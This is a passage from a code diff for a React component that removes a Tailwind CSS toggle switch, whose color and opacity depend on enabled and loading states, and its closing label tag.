-                <div className={`w-11 h-6 rounded-full peer peer-focus:ring-4 peer-focus:ring-blue-300 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border after:rounded-full after:h-5 after:w-5 after:transition-all ${
-                    enabled ? 'bg-green-600' : 'bg-gray-200'
-                } ${isLoading ? 'opacity-50' : ''}`}></div>
-            </label>
         </div>
     );
 
